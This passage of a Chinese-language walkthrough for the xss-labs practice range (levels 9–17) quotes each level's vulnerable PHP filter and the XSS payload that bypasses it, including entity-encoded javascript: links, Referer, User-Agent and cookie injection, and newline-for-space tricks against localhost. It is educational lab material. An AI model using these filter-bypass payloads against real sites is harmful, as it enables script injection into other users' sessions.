http \u7b49\u5b57\u6837\u5c31\u884c\uff0c\u770b\u4e00\u770b\u540e\u7aef\u53d1\u73b0\u8fd9\u4e00\u5173\u662f\u7b2c\u4e8c\u79cd\u60c5\u51b5\uff0c\u90a3\u5c31\u5f88\u8212\u670d\u4e86\uff08\u95ee\u4e00\u4e0b  \u7b2c\u4e00\u79cd\u60c5\u51b5\u600e\u4e48\u529e\uff09\u3002</p> </li> <li> <p>\u90a3\u6211\u4eec\u5148\u5c1d\u8bd5\u4e00\u4e0b<code>javascript:alert()http://www.baidu.com</code>\u4f46\u662f\u8fd9\u9996\u5148\u5c31\u4e0d\u7b26\u5408\u8bed\u6cd5\uff0c\u5e94\u8be5\u5728 http \u524d\u9762\u52a0\u6ce8\u91ca\uff0c\uff08\u53cd\u6b63\u4e0d\u6267\u884c\uff0c\u540e\u7aef\u53ea\u662f\u68c0\u6d4b\u4e00\u4e0b\u6709\u6ca1\u6709\u8fd9\u4e2a\u5b57\u6837\uff09\u6240\u4ee5\u6211\u4eec\u5e94\u8be5\u6539\u6210<code>javascript: alert(1) //http://ww![2](./xss-labs/9/2.jpg)w.baidu.com</code></p> </li> <li> <p>\u4f46\u662f\u8f93\u5165\u4e4b\u540e\u5e76\u4e0d\u884c\uff0c\u600e\u4e48\u56de\u4e8b\uff0c\u770b\u770b\u9875\u9762\u6e90\u7801\uff0c\u53d1\u73b0 href \u4e2d\u7684 \u201c script \u201d \u88ab\u63d2\u5165\u4e86\u4e0b\u5212\u7ebf</p> </li> <li>\u8fd9\u5e94\u8be5\u662f\u540e\u7aef\u5339\u914d\u5230 script \u7136\u540e\u505a\u4e86\u66ff\u6362\uff0c\u56e0\u4e3a\u662f\u5728 href \u91cc\u9762\uff0c\u90a3\u6211\u4eec\u5c31\u8fdb\u884c Unicode \u7f16\u7801\uff0c\uff08\u6ce8\u610f\u522b\u628ahtml\u7ed9\u7f16\u7801\u4e86\uff09<code>javasc&amp;#114;ipt:alert(1)//http://</code></li> <li>\u6211\u4eec\u770b\u4e00\u770b\u540e\u7aef\u4ee3\u7801\uff1a</li> </ol> PHP<pre><code>  $str = strtolower($_GET[\"keyword\"]);\n  $str2 = str_replace(\"script\", \"scr_ipt\", $str);\n  $str3 = str_replace(\"on\", \"o_n\", $str2);\n  $str4 = str_replace(\"src\", \"sr_c\", $str3);\n  $str5 = str_replace(\"data\", \"da_ta\", $str4);\n  $str6 = str_replace(\"href\", \"hr_ef\", $str5);\n  $str7 = str_replace('\"', '&amp;quot', $str6);\n  echo '&lt;center&gt;\n&lt;form action=level9.php method=GET&gt;\n&lt;input name=keyword  value=\"' . htmlspecialchars($str) . '\"&gt;\n&lt;input type=submit name=submit value=\u6dfb\u52a0\u53cb\u60c5\u94fe\u63a5 /&gt;\n&lt;/form&gt;\n&lt;/center&gt;';\n  ?&gt;\n  &lt;?php\n  if (false === strpos($str7, 'http://')) {\n    echo '&lt;center&gt;&lt;BR&gt;&lt;a href=\"\u60a8\u7684\u94fe\u63a5\u4e0d\u5408\u6cd5\uff1f\u6709\u6ca1\u6709\uff01\"&gt;\u53cb\u60c5\u94fe\u63a5&lt;/a&gt;&lt;/center&gt;';\n  } else {\n    echo '&lt;center&gt;&lt;BR&gt;&lt;a href=\"' . $str7 . '\"&gt;\u53cb\u60c5\u94fe\u63a5&lt;/a&gt;&lt;/center&gt;';\n  }\n  ?&gt;\n</code></pre> <ol> <li>\u770b\u5230\u4e86\u5427\uff0c\u4f7f\u7528\u4e86 strpos() \u51fd\u6570\u8fdb\u884c\u4e86\u5339\u914d   \u70b9\u6211\u5b66\u4e60 strpos() \u51fd\u6570</li> </ol>"},{"location":"WEB/labs/xss-labs%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/#level-10","title":"level-10 \u9690\u85cf\u4fe1\u606f","text":"<p>http://127.0.0.1/xss-labs/level10.php?keyword=well done!</p> <ol> <li>\u6211\u4eec\u8fdb\u7f51\u9875\u6e90\u7801\u770b\u4e00\u770b\uff0c\u53d1\u73b0\u6709\u4e09\u4e2a input \u6807\u7b7e\u88ab\u9690\u85cf\u4e86\uff0c\u4f46\u662f\u6211\u4eec\u4e0d\u77e5\u9053\u8fd9\u4e09\u4e2a\u6807\u7b7e\u54ea\u4e00\u4e2a\u53ef\u4ee5\u5229\u7528\uff0c\u90a3\u4e48\u6839\u636e\u4ed6\u4eec\u7684name\u6784\u9020\u4f20\u503c\uff0c\u8ba9\u5b83\u4eec\u7684type\u6539\u53d8\uff0c\u4e0d\u518d\u9690\u85cf\uff0c\u8c01\u51fa\u6765\u4e86\u8c01\u5c31\u80fd\u5229\u7528\uff0c <code>t_link\" type='text'&gt;//&amp;t_history\" type='text'&gt;//&amp;t_sort=\" type='text'&gt;//</code>\u8bd5\u4e00\u8bd5\uff0c\u53d1\u73b0\u7b2c\u4e09\u4e2a\u88ab\u4fee\u6539\u4e86\uff08\u6216\u8005\u662f\u8f93\u5165<code>a&amp;t_link=aa&amp;t_history=bb&amp;t_sort=cc</code>\u56de\u8f66\u540e\u53d1\u73b0\u9875\u9762\u6e90\u7801\u4e2d\u4e4b\u540e t_sort \u88ab\u6539\u52a8\u4e86\uff09  </li> <li>\u90a3\u6211\u4eec\u5462\u5c31\u76f4\u63a5\u6784\u9020payload\uff1a<code>&amp;t_sort=\" type='text' onclick=javascript:alert(12)&gt;//</code>\uff0c\u6210\u529f</li> <li>\u770b\u4e00\u770b\u540e\u7aef</li> </ol> <p>PHP<pre><code>    &lt;?php\n    ini_set(\"display_errors\", 0);\n    $str = $_GET[\"keyword\"];\n    $str11 = $_GET[\"t_sort\"];\n    $str22 = str_replace(\"&gt;\", \"\", $str11);\n    $str33 = str_replace(\"&lt;\", \"\", $str22);\n    echo \"&lt;h2 align=center&gt;\u6ca1\u6709\u627e\u5230\u548c\" . htmlspecialchars($str) . \"\u76f8\u5173\u7684\u7ed3\u679c.&lt;/h2&gt;\" . '&lt;center&gt;\n&lt;form id=search&gt;\n&lt;input name=\"t_link\"  value=\"' . '\" type=\"hidden\"&gt;\n&lt;input name=\"t_history\"  value=\"' . '\" type=\"hidden\"&gt;\n&lt;input name=\"t_sort\"  value=\"' . $str33 . '\" type=\"hidden\"&gt;\n&lt;/form&gt;\n&lt;/center&gt;';\n    ?&gt;\n</code></pre> 4. \u53d1\u73b0 <code>$_GET[\"t_sort\"]</code> \u7ecf\u8fc7\u5220\u9664\u5c16\u62ec\u53f7\u7b49\u64cd\u4f5c\uff0c\u6700\u7ec8\u653e\u5230\u4e86\u7b2c\u4e09\u4e2a input \u6807\u7b7e\u91cc\u3002</p>"},{"location":"WEB/labs/xss-labs%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/#level-11-referer","title":"level-11 referer","text":"<p>http://127.0.0.1/xss-labs/level11.php?keyword=good job! 1. \u6211\u4eec\u770b\u770b\u9875\u9762\u6e90\u7801\uff0c\u53d1\u73b0\u6709\u56db\u4e2a\u88ab\u9690\u85cf\u7684 input \u6807\u7b7e\uff0c\u76f8\u6bd4\u4e8e\u4e0a\u4e00\u5173\u591a\u51fa\u4e86\u4e00\u4e2a\u53eb t_ref \u7684\u6807\u7b7e\uff0cref\uff0c\u6709\u6ca1\u6709\u60f3\u5230\u4ec0\u4e48\uff0c\u5f53\u7136\u662f referer\u3002\uff08\u5e76\u4e14\u8fd9\u4e2a\u6807\u7b7e\u503c\u4e3a\u7b2c10\u5173URL\uff09 Referer  \u662f  HTTP  \u8bf7\u6c42header \u7684\u4e00\u90e8\u5206\uff0c\u5f53\u6d4f\u89c8\u5668\uff08\u6216\u8005\u6a21\u62df\u6d4f\u89c8\u5668\u884c\u4e3a\uff09\u5411web \u670d\u52a1\u5668\u53d1\u9001\u8bf7\u6c42\u7684\u65f6\u5019\uff0c\u5934\u4fe1\u606f\u91cc\u6709\u5305\u542b  Referer  \u3002\u6bd4\u5982\u6211\u5728www.google.com \u91cc\u6709\u4e00\u4e2awww.baidu.com \u94fe\u63a5\uff0c\u90a3\u4e48\u70b9\u51fb\u8fd9\u4e2awww.baidu.com \uff0c\u5b83\u7684header \u4fe1\u606f\u91cc\u5c31\u6709\uff1aReferer=http://www.google.com</p> <p>\u7531\u6b64\u53ef\u4ee5\u770b\u51fa\u6765\u5427\u3002\u5b83\u5c31\u662f\u8868\u793a\u4e00\u4e2a\u6765\u6e90\u3002\u770b\u4e0b\u56fe\u7684\u4e00\u4e2a\u8bf7\u6c42\u7684 Referer  \u4fe1\u606f\u3002</p> <ol> <li> <p>\u65e2\u7136\u5982\u6b64\uff0c\u90a3\u6211\u4eec\u5c31\u8bd5\u8bd5\u7528 Burp \u6293\u5305\uff0c\u7136\u540e\u4fee\u6539 referer\uff0c\u5443\u5f53\u7136\u662f\u5148\u53bb\u7b2c\u5341\u5173\uff0c\u5728\u5f39\u7a97\u6210\u529f\u90a3\u513f\uff08\u8df3\u8f6c11\u5173\u7684\u65f6\u5019\uff09\u6293\u5305\u3002\u5982\u56fe\u4e3a\u6293\u5230\u7684\u6570\u636e\u5305\uff1a</p> </li> <li> <p>\u6211\u4eec\u5c06\u6570\u636e\u5305\u4fee\u6539\u4e3a<code>referer:&amp;t_sort=\" type='text' onclick=javascript:alert()&gt;//![3](./xss-labs/11/3.jpg)</code>\uff0c\u7136\u540e\u653e\u884c\uff0c\u53d1\u73b0\u9875\u9762\u786e\u5b9e\u6709\u4e86\u4e00\u4e2a\u6846\uff0c\u70b9\u51fb\u6210\u529f\u5f39\u7a97</p> </li> <li>\u6700\u540e\u6211\u4eec\u6765\u770b\u4e0b\u540e\u7aef\u4ee3\u7801\uff1a\u53d1\u73b0\u786e\u5b9e\u662f<code>$str11 = $_SERVER['HTTP_REFERER'];</code></li> </ol> PHP<pre><code>    ini_set(\"display_errors\", 0);\n    $str = $_GET[\"keyword\"];\n    $str00 = $_GET[\"t_sort\"];\n    $str11 = $_SERVER['HTTP_REFERER'];\n    $str22 = str_replace(\"&gt;\", \"\", $str11);\n    $str33 = str_replace(\"&lt;\", \"\", $str22);\n    echo \"&lt;h2 align=center&gt;\u6ca1\u6709\u627e\u5230\u548c\" . htmlspecialchars($str) . \"\u76f8\u5173\u7684\u7ed3\u679c.&lt;/h2&gt;\" . '&lt;center&gt;\n&lt;form id=search&gt;\n&lt;input name=\"t_link\"  value=\"' . '\" type=\"hidden\"&gt;\n&lt;input name=\"t_history\"  value=\"' . '\" type=\"hidden\"&gt;\n&lt;input name=\"t_sort\"  value=\"' . htmlspecialchars($str00) . '\" type=\"hidden\"&gt;\n&lt;input name=\"t_ref\"  value=\"' . $str33 . '\" type=\"hidden\"&gt;\n&lt;/form&gt;\n&lt;/center&gt;';\n</code></pre>"},{"location":"WEB/labs/xss-labs%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/#level-12-user-agent","title":"level-12 user-agent","text":"<p>http://127.0.0.1/xss-labs/level12.php?keyword=good job!</p> <ol> <li>\u8fd8\u662f\u770b\u9875\u9762\u6e90\u7801\uff0c\u8fd9\u6b21\u7684\u53c8\u6210\u4e86 t_ua \uff0cUA\uff0c\u540e\u9762\u7684\u503c\u4e5f\u4e00\u770b\u5c31\u662fUA\uff0c\u90a3\u6211\u4eec\u542f\u52a8Burp\uff01</li> <li>\u5982\u56fe\u4e3a\u6211\u4eec\u6293\u5230\u7684\u6570\u636e\u5305\uff1a</li> <li>\u6211\u4eec\u5bf9 UA \u7684\u503c\u8fdb\u884c\u4fee\u6539\uff1a<code>\"type=\"te![3](./xss-labs/12/3.jpg)xt\" onmousemove=\"alert()</code></li> <li>\u4fee\u6539\u540e\u653e\u884c\uff0c\u6210\u529f\u5f39\u7a97\uff0c\u6211\u4eec\u770b\u770b\u540e\u7aef\u4ee3\u7801\uff1a\uff08<code>$str11 = $_SERVER['HTTP_USER_AGENT'];</code>\uff09</li> </ol> PHP<pre><code>    ini_set(\"display_errors\", 0);\n    $str = $_GET[\"keyword\"];\n    $str00 = $_GET[\"t_sort\"];\n    $str11 = $_SERVER['HTTP_USER_AGENT'];\n    $str22 = str_replace(\"&gt;\", \"\", $str11);\n    $str33 = str_replace(\"&lt;\", \"\", $str22);\n    echo \"&lt;h2 align=center&gt;\u6ca1\u6709\u627e\u5230\u548c\" . htmlspecialchars($str) . \"\u76f8\u5173\u7684\u7ed3\u679c.&lt;/h2&gt;\" . '&lt;center&gt;\n&lt;form id=search&gt;\n&lt;input name=\"t_link\"  value=\"' . '\" type=\"hidden\"&gt;\n&lt;input name=\"t_history\"  value=\"' . '\" type=\"hidden\"&gt;\n&lt;input name=\"t_sort\"  value=\"' . htmlspecialchars($str00) . '\" type=\"hidden\"&gt;\n&lt;input name=\"t_ua\"  value=\"' . $str33 . '\" type=\"hidden\"&gt;\n&lt;/form&gt;\n&lt;/center&gt;';\n</code></pre>"},{"location":"WEB/labs/xss-labs%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/#level-13-cookie","title":"level-13 cookie","text":"<p>http://127.0.0.1/xss-labs/level13.php?keyword=good job!</p> <ol> <li>\u5148\u770b\u770b\u524d\u7aef\u4ee3\u7801\uff0c\u8fd9\u6b21\u53c8\u6362\u6210\u4e86 t_cook \uff0c\u5443\uff0ccookies\uff1f\u770b\u4e00\u770b cookies \uff0c\u957f\u5f97\u786e\u5b9e\u5f88\u5947\u602a\u3002\u90a3\u5c31\u8fd8\u662f Burp \u6539\u5305\u3002 </li> <li>\u6211\u4eec\u5728Burp\u6293\u5230\u6570\u636e\u5305\u4e4b\u540e\uff0c\u5c06 cookie \u4fee\u6539\u4e3a<code>\"type='text' onclick=javascript:![2](./xss-labs/13/2.jpg)alert(1)//</code>\uff0c\u5982\u56fe\uff1a</li> <li>\u653e\u884c\u540e\u679c\u7136\u6709\u4e86\u4e00\u4e2a\u6846\uff0c\u4e5f\u6210\u529f\u5f39\u7a97\u3002</li> <li>\u770b\u770b\u540e\u7aef\u4ee3\u7801\uff1a\uff08<code>$str11 = $_COOKIE[\"user\"];</code>\uff09</li> </ol> PHP<pre><code>    setcookie(\"user\", \"call me maybe?\", time() + 3600);\n    ini_set(\"display_errors\", 0);\n    $str = $_GET[\"keyword\"];\n    $str00 = $_GET[\"t_sort\"];\n    $str11 = $_COOKIE[\"user\"];\n    $str22 = str_replace(\"&gt;\", \"\", $str11);\n    $str33 = str_replace(\"&lt;\", \"\", $str22);\n    echo \"&lt;h2 align=center&gt;\u6ca1\u6709\u627e\u5230\u548c\" . htmlspecialchars($str) . \"\u76f8\u5173\u7684\u7ed3\u679c.&lt;/h2&gt;\" . '&lt;center&gt;\n&lt;form id=search&gt;\n&lt;input name=\"t_link\"  value=\"' . '\" type=\"hidden\"&gt;\n&lt;input name=\"t_history\"  value=\"' . '\" type=\"hidden\"&gt;\n&lt;input name=\"t_sort\"  value=\"' . htmlspecialchars($str00) . '\" type=\"hidden\"&gt;\n&lt;input name=\"t_cook\"  value=\"' . $str33 . '\" type=\"hidden\"&gt;\n&lt;/form&gt;\n&lt;/center&gt;';\n</code></pre>"},{"location":"WEB/labs/xss-labs%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/#level-14-exif","title":"level-14 exif","text":"<p>http://127.0.0.1/xss-labs/level14.php 1. \u770b\u4e86\u770b\u7f51\u4e0a\uff0c\u597d\u591a\u8bf4\u8fd9\u4e2a\u9898\u6709\u95ee\u9898\uff0c\u9875\u9762\u4e5f\u6b63\u5e38\u663e\u793a\u4e0d\u51fa\u6765\u3002\u6211\u4eec\u5c31\u76f4\u63a5\u770b\u770b\u540e\u7aef\u4ee3\u7801\u5427\u3002</p> <p>HTML<pre><code>&lt;body&gt;\n    &lt;h1 align=center&gt;\u6b22\u8fce\u6765\u5230level14&lt;/h1&gt;\n    &lt;center&gt;&lt;iframe name=\"leftframe\" marginwidth=10 marginheight=10 src=\"http://www.exifviewer.org/\" frameborder=no width=\"80%\" scrolling=\"no\" height=80%&gt;&lt;/iframe&gt;&lt;/center&gt;\n    &lt;center&gt;\u8fd9\u5173\u6210\u529f\u540e\u4e0d\u4f1a\u81ea\u52a8\u8df3\u8f6c\u3002\u6210\u529f\u8005&lt;a href=/xsschallenge/level15.php?src=1.gif&gt;\u70b9\u6211\u8fdblevel15&lt;/a&gt;&lt;/center&gt;\n&lt;/body&gt;\n</code></pre> 2. \uff08payload\u662f\u4e00\u5f20\u56fe\u7247\u9a6c\uff0c\u8003\u5230\u4e86CTF\u4e2d\u7684\u6742\u9879\u4e2d\u9690\u5199 Exif \u9690\u85cf\u4fe1\u606f\uff09\u5927\u81f4\u610f\u601d\u5c31\u662f\u901a\u8fc7\u4fee\u6539 iframe \u8c03\u7528\u7684\u6587\u4ef6\uff08 src \uff09\u6765\u5b9e\u73b0 xss \u6ce8\u5165\u3002\u4e0a\u4f20\u7684\u56fe\u7247\u7684 EXIF \u4e2d\u5305\u542b\u6076\u610f\u4ee3\u7801\uff0c\u7136\u540e\u5f53\u56fe\u7247\u88ab\u89e3\u6790\u7684\u65f6\u5019\uff0c\u5176\u4e2dEXIF\u4e2d\u7684\u4ee3\u7801\u5c31\u4f1a\u88ab\u6267\u884c\u3002</p> <ol> <li>\u53bb\u4e86\u89e3\u4e00\u4e0b EXIF \u5427 <p>exif\u662f\u53ef\u4ea4\u6362\u56fe\u50cf\u6587\u4ef6\u683c\u5f0f\uff08\u82f1\u8bed\uff1aExchangeable image file format\uff0c\u5b98\u65b9\u7b80\u79f0Exif\uff09\uff0c\u662f\u4e13\u95e8\u4e3a\u6570\u7801\u76f8\u673a\u7684\u7167\u7247\u8bbe\u5b9a\u7684\uff0c\u53ef\u4ee5\u8bb0\u5f55\u6570\u7801\u7167\u7247\u7684\u5c5e\u6027\u4fe1\u606f\u548c\u62cd\u6444\u6570\u636e\u3002</p> </li> </ol>"},{"location":"WEB/labs/xss-labs%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/#level-15-ng-include","title":"level-15 ng-include","text":"<p>http://127.0.0.1/xss-labs/level15.php?src=1.gif</p> <ol> <li>\u6211\u4eec\u5148\u5c1d\u8bd5\u5c06 url \u4e2d\u7684 1.gif \u4fee\u6539\u4e3a <code>&lt;script&gt;alert()&lt;/script&gt;</code>\uff0c\u7136\u540e\u770b\u770b\u9875\u9762\u6e90\u7801\uff0c\u53d1\u73b0\u9664\u4e86\u6709\u4e2a<code>&lt;!-- ngInclude: &lt;script&gt;alert()&lt;/script&gt; --&gt;</code>\u4e5f\u6ca1\u6709\u522b\u7684\u4e1c\u897f\u4e86\uff0c\u90a3\u6211\u4eec\u5c31\u641c\u4e00\u641c\u5565\u662f nginclude</li> </ol> <p>ng-include \u6307\u4ee4\u7528\u4e8e\u5305\u542b\u5916\u90e8\u7684 HTML \u6587\u4ef6\u3002 \u5305\u542b\u7684\u5185\u5bb9\u5c06\u4f5c\u4e3a\u6307\u5b9a\u5143\u7d20\u7684\u5b50\u8282\u70b9\u3002 ng-include \u5c5e\u6027\u7684\u503c\u53ef\u4ee5\u662f\u4e00\u4e2a\u8868\u8fbe\u5f0f\uff0c\u8fd4\u56de\u4e00\u4e2a\u6587\u4ef6\u540d\u3002 \u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u5305\u542b\u7684\u6587\u4ef6\u9700\u8981\u5305\u542b\u5728\u540c\u4e00\u4e2a\u57df\u540d\u4e0b\u3002</p> <ol> <li> <p>\u90a3\u4e5f\u5c31\u662f\u8bf4\uff0c\u6211\u4eec\u53ea\u8981\u4f7f ng-include \u5305\u542b\u4e00\u4e2a\u5f39\u7a97\u9875\u9762\u5c31\u884c\uff0c\u800c\u4e14\u201c\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u5305\u542b\u7684\u6587\u4ef6\u9700\u8981\u5305\u542b\u5728\u540c\u4e00\u4e2a\u57df\u540d\u4e0b\u201d\u3002\u90a3\u6211\u4eec\u5c31\u628a\u7b2c\u4e00\u5173\u642c\u8fc7\u6765\u3002\uff08<code>http://127.0.0.1/xss-labs/level1.php?nam![2](./xss-labs/15/2.jpg)e=%3Cscript%3Ealert(1)%3C/script%3E</code>\uff09</p> </li> <li> <p>\u800c\u76f4\u63a5\u628a\u4e0a\u8ff0\u5185\u5bb9\u66ff\u6362 1.gif \u56de\u8f66\u540e\u53d1\u73b0\u6ca1\u6709\u4efb\u4f55\u4f5c\u7528\uff0c\u8fd9\u662f\u56e0\u4e3a\u6ca1\u6709\u52a0\u5355\u5f15\u53f7\uff0c\u5fc5\u987b\u7528\u5355\u5f15\u53f7\u5305\u56f4\u8d77\u6765\u3002 \u56de\u8f66\u540e\u6211\u4eec\u5462\u770b\u5230\u9875\u9762\u4e2d\u786e\u5b9e\u6709\u4e86\u6574\u4e2a\u7b2c\u4e00\u5173\u7684\u4e1c\u897f\uff0c\u9875\u9762\u6e90\u7801\u91cc\u9762\u4e5f\u5305\u542b\u4e86\u7b2c\u4e00\u5173\u7684\u4e1c\u897f\uff0c\u4f46\u662f\u4f9d\u65e7\u6ca1\u6709\u5f39\u7a97\u3002</p> </li> <li>\u8fd9\u79cd\u60c5\u51b5\u5f88\u53ef\u80fd\u662f script\u6807\u7b7e \u88ab\u9875\u9762\u8fc7\u6ee4\u6389\u4e86\u3002\u90a3\u6211\u4eec\u6362\u4e00\u79cd\u65b9\u5f0f\uff1a\uff08\u6ce8\u610f\uff0c\u8fd9\u91cc\u4e0d\u80fd\u5305\u6db5\u90a3\u4e9b\u76f4\u63a5\u5f39\u7a97\u7684\u4e1c\u897f\u5982<code>&lt;script&gt;</code>\uff0c\u4f46\u662f\u53ef\u4ee5\u5305\u6db5\u90a3\u4e9b\u6807\u7b7e\u7684\u4e1c\u897f\u6bd4\u5982<code>&lt;a&gt;</code>\u3001<code>&lt;input&gt;</code>\u3001<code>&lt;img&gt;</code>\u3001<code>&lt;p&gt;</code>\u6807\u7b7e\u7b49\u7b49\uff0c\u8fd9\u4e9b\u6807\u7b7e\u662f\u80fd\u9700\u8981\u6211\u4eec\u624b\u52a8\u70b9\u51fb\u5f39\u7a97\u7684\uff09 \u65b9\u6cd5\u4e00\uff1a<code>http://127.0.0.1/xss-labs/level1.php?name=a&lt;img src=1 onerror=alert()&gt;</code> \u65b9\u6cd5\u4e8c\uff1a<code>http://127.0.0.1/xss-labs/level1.php?name=&lt;p onmousedown=alert()&gt;AAA&lt;/p&gt;</code> \u65b9\u6cd5\u4e09\uff1a<code>http://127.0.0.1/xss-labs/level1.php?name=&lt;a href=\"javascript:alert()\"&gt;</code> \u7b49\u7b49\u2026\u2026\u2026\u2026\u2026\u2026</li> <li>\u770b\u4e00\u770b\u540e\u7aef PHP<pre><code>&lt;?php\nini_set(\"display_errors\", 0);\n$str = $_GET[\"src\"];\necho '&lt;body&gt;&lt;span class=\"ng-include:' . htmlspecialchars($str) . '\"&gt;&lt;/span&gt;&lt;/body&gt;';\n?&gt;\n</code></pre></li> <li>\u8fd8\u6709\u5c31\u662f\u4e86\u89e3\u4e00\u4e0b angular \uff08\u524d\u7aef\u6846\u67b6\uff09\u56e0\u4e3a\u8fd9\u4e2a ng-include \u662f\u5b83\u7684\u4e1c\u897f</li> </ol>"},{"location":"WEB/labs/xss-labs%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/#level-16","title":"level-16 \u7a7a\u683c\u5b9e\u4f53\u8f6c\u4e49","text":"<p>http://127.0.0.1/xss-labs/level16.php?keyword=test</p> <ol> <li>\u56e0\u4e3a\u524d\u9762\u6709 center \u6807\u7b7e\uff0c\u6211\u5c31\u60f3\u7740\u5148\u628a\u5b83\u95ed\u5408\u6389\uff0c<code>&lt;/center&gt;&lt;script&gt;alert(![1](./xss-labs/16/1.jpg))&lt;/script&gt;</code> \u4f46\u662f\u4e0d\u7ba1\u662f / \u8fd8\u662f script \u90fd\u88ab\u8fc7\u6ee4\u4e86\uff1a</li> <li>\u90a3\u597d\uff0c\u90a3\u6211\u8bd5\u4e00\u8bd5\u4e0a\u4e00\u5173\u7684<code>&lt;img src=1 onerror![2](./xss-labs/16/2.jpg)=alert()&gt;</code>\uff0c\u4f46\u662f\u770b\u8d77\u6765\u7a7a\u683c\u4e5f\u88ab\u5f04\u4e86</li> </ol> <p>HTML\u63d0\u4f9b\u4e865\u79cd\u7a7a\u683c\u5b9e\u4f53\uff08space entity\uff09\uff0c\u5b83\u4eec\u62e5\u6709\u4e0d\u540c\u7684\u5bbd\u5ea6\uff0c\u975e\u65ad\u884c\u7a7a\u683c\uff08<code>&amp;nbsp;</code>\uff09\u662f\u5e38\u89c4\u7a7a\u683c\u7684\u5bbd\u5ea6\uff0c\u53ef\u8fd0\u884c\u4e8e\u6240\u6709\u4e3b\u6d41\u6d4f\u89c8\u5668\u3002\u5176\u4ed6\u51e0\u79cd\u7a7a\u683c\uff08 <code>&amp;ensp; &amp;emsp; &amp;thinsp; &amp;zwnj;&amp;zwj;</code>\uff09\u5728\u4e0d\u540c\u6d4f\u89c8\u5668\u4e2d\u5bbd\u5ea6\u5404\u5f02\u3002</p> <ol> <li>\u65e2\u7136\u5982\u6b64\uff0c\u90a3\u6211\u4eec\u5c31\u76f4\u63a5\u628a \u6362\u884c\u7b26 \u7ed9 URL \u7f16\u7801\u4e00\u4e0b\uff0c%0A\uff0c\u7528 %0A \u66ff\u6362\u7a7a\u683c\uff0c\u6210\u529f\u5f39\u7a97\u3002\u81f3\u4e8e\u4e3a\u4ec0\u4e48\u4e0d\u662f\u7528\u7a7a\u683c URL \u7f16\u7801\uff0c\u800c\u662f\u7528\u6362\u884c\u7b26 \u8fd9\u662f\u56e0\u4e3a\u7528\u6362\u884c\u7b26\u66ff\u6362\u7a7a\u683c\u6548\u679c\u4e00\u6837 (\u5728 html \u4e2d\uff0c\u4e0d\u8bba\u52a0\u591a\u5c11\u7a7a\u683c\u6216\u8005\u56de\u8f66\uff0c\u90fd\u4f1a\u88ab\u8f6c\u6210\u4e00\u4e2a\u7a7a\u683c) </li> <li>\u4e5f\u5c31\u662f\u8bf4\uff0c\u6211\u4eec\u6700\u540e\u8f93\u5165\u7684\u4e3a <code>&lt;img%0Asrc=1%0Aonerror=alert()&gt;</code>\uff0c\u6210\u529f\u5f39\u7a97\u3002</li> <li>\u770b\u770b\u540e\u7aef\u4ee3\u7801\uff1a</li> </ol> PHP<pre><code>&lt;?php\n    ini_set(\"display_errors\", 0);\n    $str = strtolower($_GET[\"keyword\"]);\n    $str2 = str_replace(\"script\", \"&amp;nbsp;\", $str);\n    $str3 = str_replace(\" \", \"&amp;nbsp;\", $str2);\n    $str4 = str_replace(\"/\", \"&amp;nbsp;\", $str3);\n    $str5 = str_replace(\"   \", \"&amp;nbsp;\", $str4);\n    echo \"&lt;center&gt;\" . $str5 . \"&lt;/center&gt;\";\n?&gt;\n</code></pre>"},{"location":"WEB/labs/xss-labs%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/#level-17","title":"level-17 \u53c2\u6570\u62fc\u63a5","text":"<p>http://127.0.0.1/xss-labs/level17.php?arg01=a&amp;arg02=b</p> <ol> <li>\u6211\u4eec\u5148\u770b\u770b\u9875\u9762\u6e90\u7801\uff0c\u53d1\u73b0\u4e86\u4e00\u4e2a embed \u6807\u7b7e \uff0c\u800c\u4e14\u91cc\u9762\u7684 src \u5c31\u662f\u6211\u4eec URL \u4e2d\u7684\u4e1c\u897f\u3002</li> <li>\u90a3\u6211\u4eec\u5c31\u5c1d\u8bd5\u53bb\u95ed\u5408\u6389\u5b83\uff0c\u6211\u4eec\u5728URL\u7684\u6700\u540e\u9762\u52a0\u4e0a <code>\" onmouseover='alert()'</code>\uff0c\u5f53\u9f20\u6807\u79fb\u52a8\u5230\u56fe\u7247\u4e0a\u9762\u65f6\u6210\u529f\u5f39\u7a97\u3002</li> <li>\u4e86\u89e3\u4e00\u4e0b embed \u6807\u7b7e\uff1a</li> </ol> <p>embed \u6807\u7b7e\u5b9a\u4e49\u4e86\u4e00\u4e2a\u5bb9\u5668\uff0c\u7528\u6765\u5d4c\u5165\u5916\u90e8\u5e94\u7528\u6216\u8005\u4e92\u52a8\u7a0b\u5e8f\uff08\u63d2\u4ef6\uff09\u3002</p> <p>embed\u6807\u7b7e\u53ef\u4ee5\u7406\u89e3\u4e3a\u5b9a\u4e49\u4e86\u4e00\u4e2a\u533a\u57df\uff0c\u53ef\u4ee5\u653e\u56fe\u7247\u3001\u89c6\u9891\u3001\u97f3\u9891\u7b49\u5185\u5bb9\uff0c\u4f46\u662f\u5462\u76f8\u5bf9\u4e8e\u4ed6\u4eec\uff0cembed\u6807\u7b7e\u6253\u5f00\u4e0d\u4e86\u6587\u4ef6\u7684\u65f6\u5019\u5c31\u4f1a\u6709\u5757\u9519\u8bef\u7684\u533a\u57df\u3002\u4e5f\u53ef\u4ee5\u7ed1\u5b9a\u5404\u79cd\u4e8b\u4ef6\uff0c\u6bd4\u5982\u5c1d\u8bd5\u7ed1\u5b9a\u4e00\u4e2aonmouseover\u4e8b\u4ef6\u3002\u540e\u53f0\u770b\u4ee3\u7801\u7528\u4e86htmlspecialchars\uff0c\u6240\u4ee5\u76f4\u63a5\u5199\u6807\u7b7e\u662f\u4e0d\u884c\u7684\u3002embed\u6807\u7b7e\u57fa\u672c\u4e0d\u600e\u4e48\u7528\u4e86\uff0c\u6240\u4ee5\u8fd9\u4e00\u5173\u5c31\u7b80\u5355\u4e86\u89e3\u4e00\u4e0b\u5373\u53ef\u3002</p> <ol> 